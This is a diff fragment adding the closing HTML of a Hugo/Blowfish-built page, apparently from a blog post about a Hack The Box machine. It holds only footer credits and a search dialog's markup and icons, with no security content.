+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  role="dialog"
+  aria-modal="true"
+  aria-label="Search"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="/archetype-htb/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          aria-label="Search"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+    
+    
+  </body>
+  
+</html>
